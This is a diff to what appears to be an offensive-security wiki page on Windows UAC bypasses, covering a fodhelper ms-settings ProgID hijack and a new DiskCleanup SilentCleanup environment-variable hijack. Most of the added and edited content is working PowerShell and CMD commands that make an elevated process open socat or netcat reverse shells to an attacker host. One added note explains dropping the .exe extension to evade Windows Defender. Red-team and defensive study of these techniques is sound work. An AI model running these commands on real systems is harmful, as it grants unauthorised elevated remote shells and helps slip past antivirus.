@@ -39,7 +39,7 @@ Microsoft doesn't consider UAC a security boundary but rather a simple convenien
 
 ### Using ProgID and AutoElevate binary to bypass UAC
 
-we will create an entry on the registry for a new progID of our choice (any name will do) and then point the CurVer entry in the ms-settings progID to our newly created progID. This way, when fodhelper tries opening a file using the ms-settings progID, it will notice the CurVer entry pointing to our new progID and check it to see what command to use.
+We will create an entry on the registry for a new `progID` of our choice (any name will do) and then point the `CurVer` entry in the `ms-settings progID` to our newly created progID. This way, when `fodhelper` tries opening a file using the `ms-settings progID`, it will notice the `CurVer` entry pointing to our new `progID` and check it to see what command to use.
 
 {% tabs %}
 {% tab title="Powershell" %}
@@ -47,9 +47,9 @@ The exploit code is proposed by [V3ded](https://v3ded.github.io/redteam/utilizin
 
 ```bash
 # Using socat
-$program = "powershell -windowstyle hidden C:\tools\socat\socat.exe TCP:<attacker_ip>:4445 EXEC:cmd.exe,pipes"
+$program = "powershell -windowstyle hidden C:\tools\socat\socat TCP:<attacker_ip>:4445 EXEC:cmd.exe,pipes"
 # Or using netcat
-$program = "powershell -windowstyle hidden C:\Windows\Temp\nc64.exe 192.168.49.113 443 -e cmd.exe"
+$program = "powershell -windowstyle hidden C:\Windows\Temp\nc64 192.168.49.113 443 -e cmd.exe"
 
 New-Item "HKCU:\Software\Classes\.pwn\Shell\Open\command" -Force
 Set-ItemProperty "HKCU:\Software\Classes\.pwn\Shell\Open\command" -Name "(default)" -Value $program -Force
@@ -62,7 +62,15 @@ Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
 
 {% hint style="danger" %}
 Detected by Windowds Defender
+
+Note that we removed the `.exe` extension in an attempt to evade Windows Defender (e.g. using `nc64` instead of `nc64.exe`). By omitting the extension, Windows will still execute the binary.
 {% endhint %}
+
+We may clean-up as follows
+
+```powershell
+Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
+```
 {% endtab %}
 
 {% tab title="CMD" %}
@@ -78,6 +86,44 @@ C:\> reg add "HKCU\Software\Classes\ms-settings\CurVer" /d ".thm" /f
 The operation completed successfully.
 
 C:\> fodhelper.exe
+```
+{% endtab %}
+{% endtabs %}
+
+### DiskCleanup Scheduled Task to bypass UAC
+
+Originally discovered [discovered in 2017](https://www.tiraniddo.dev/2017/05/exploiting-environment-variables-in.html) by [James Forshaw](https://twitter.com/tiraniddo) from [Google Project Zero](https://googleprojectzero.blogspot.com/), the "DiskCleanup Bypass" take advantage of the `SilentCleanup` scheduled task, which is configured on Windows by default.This tasks can be started from a process with a `medium integrity level`, and then automatically elevates to a `high integrity level` since the `"Run with highest privileges"` option is enabled.&#x20;
+
+**SilentCleanup launches `cleanmgr.exe` using the `%windir%` environment variable**. By modifying `%windir%`, we can control what gets executed.
+
+{% tabs %}
+{% tab title="PowerShell" %}
+We can abuse it as follows
+
+```bash
+Set-ItemProperty -Path "HKCU:\Environment" -Name "windir" -Value "cmd.exe /K C:\Windows\Tasks\nc64.exe <IP> <PORT> & REM " -Force
+Start-ScheduledTask -TaskPath "\Microsoft\Windows\DiskCleanup" -TaskName "SilentCleanup"
+```
+
+We may clean-up as follows
+
+```powershell
+Clear-ItemProperty -Path "HKCU:\Environment" -Name "windir" -Force
+```
+{% endtab %}
+
+{% tab title="CMD" %}
+We can abuse it as follows
+
+```powershell
+reg add "HKCU\Environment" /v windir /t REG_SZ /d "cmd.exe /K C:\Windows\Tasks\nc64.exe <IP> <PORT> & REM " /f
+schtasks /run /tn "\Microsoft\Windows\DiskCleanup\SilentCleanup"
+```
+
+We may clean-up as follows
+
+```powershell
+reg delete "HKCU\Environment" /v windir /f
 ```
 {% endtab %}
 {% endtabs %}
